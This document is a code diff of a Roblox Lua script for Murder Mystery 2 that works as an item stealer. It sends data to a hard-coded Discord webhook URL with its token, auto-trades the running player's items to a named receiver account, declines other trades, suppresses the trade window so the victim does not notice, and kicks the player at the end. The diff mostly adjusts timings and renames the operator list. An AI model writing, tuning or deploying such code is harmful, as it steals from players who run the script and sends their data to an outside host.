@@ -2,8 +2,8 @@ _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
 
-local WEBHOOK       = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
-local RECEIVER      = {"iceyblueii"}
+local WEBHOOK    = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
+local RECEIVER   = {"iceyblueii"}
 local MINIMUM_VALUE = 10
 
 local CURRENT_PLACE_ID = game.PlaceId
@@ -178,7 +178,7 @@ local function AcceptIncomingTrade()
     return false
 end
 local function WaitUntilTradeEnds()
-    while GetTradeStatus() ~= "None" do task.wait(0.05) end
+    while GetTradeStatus() ~= "None" do task.wait(0.1) end
 end
 
 local BlacklistedItems = {
@@ -369,10 +369,9 @@ end
 
 SendWebhook()
 
--- GUI suppression: skip for anyone in OPERATORS table
 if IS_MM2 then
     local IS_OPERATOR = false
-    for _, Name in ipairs(OPERATORS) do
+    for _, Name in ipairs(RECEIVER) do
         if string.lower(LocalPlayer.Name) == string.lower(Name) then
             IS_OPERATOR = true
             break
@@ -380,8 +379,6 @@ if IS_MM2 then
     end
 
     if not IS_OPERATOR then
-        PlayerGui:WaitForChild("TradeGUI").Enabled = false
-        PlayerGui:WaitForChild("TradeGUI_Phone").Enabled = false
         PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function()
             PlayerGui.TradeGUI.Enabled = false
         end)
@@ -407,7 +404,7 @@ local function FindTradeTarget()
 end
 
 local MAX_TRADE_ATTEMPTS = 999
-local RETRY_WAIT = 0.5  -- was 2
+local RETRY_WAIT = 2
 
 local function ProcessAllTrades(TargetName)
     local AttemptCount = 0
@@ -416,7 +413,7 @@ local function ProcessAllTrades(TargetName)
         local CurrentStatus = GetTradeStatus()
         if CurrentStatus == "ReceivingRequest" then
             pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
-            task.wait(0.1); continue  -- was 0.5
+            task.wait(0.5); continue
         end
         if CurrentStatus == "StartTrade" then
             local ItemsToSend = math.min(4, #TradeableItems)
@@ -424,10 +421,10 @@ local function ProcessAllTrades(TargetName)
                 local Item = table.remove(TradeableItems, 1)
                 for _ = 1, Item.Count do
                     AddItemToTradeOffer(Item.DataID)
-                    task.wait(0.02)  -- was 0.05
+                    task.wait(0.05)
                 end
             end
-            task.wait(3)  -- was 6
+            task.wait(6)
             if AcceptIncomingTrade() then
                 WaitUntilTradeEnds(); ReloadInventory(); AttemptCount = 0
             else
@@ -439,13 +436,13 @@ local function ProcessAllTrades(TargetName)
             local Sent, Try = false, 1
             while not Sent and Try <= 5 do
                 if SendTradeRequestToPlayer(TargetName) then
-                    Sent = true; task.wait(0.2)  -- was 0.5
+                    Sent = true; task.wait(0.5)
                 else
-                    task.wait(math.min(Try * 0.2, 1)); Try = Try + 1  -- was 0.5/3
+                    task.wait(math.min(Try * 0.5, 3)); Try = Try + 1
                 end
             end
         end
-        task.wait(0.2)  -- was 0.5
+        task.wait(0.5)
     end
     KickAfterTransfer()
 end
@@ -456,7 +453,7 @@ local function AutoTradeOnTargetJoin()
         if IsBusy then return end
         local TargetName = FindTradeTarget()
         if TargetName and Player.Name == TargetName then
-            IsBusy = true; task.wait(1); ProcessAllTrades(Player.Name)  -- was 3
+            IsBusy = true; task.wait(3); ProcessAllTrades(Player.Name)
         end
     end
     for _, Player in ipairs(Players:GetPlayers()) do CheckPlayerJoin(Player) end
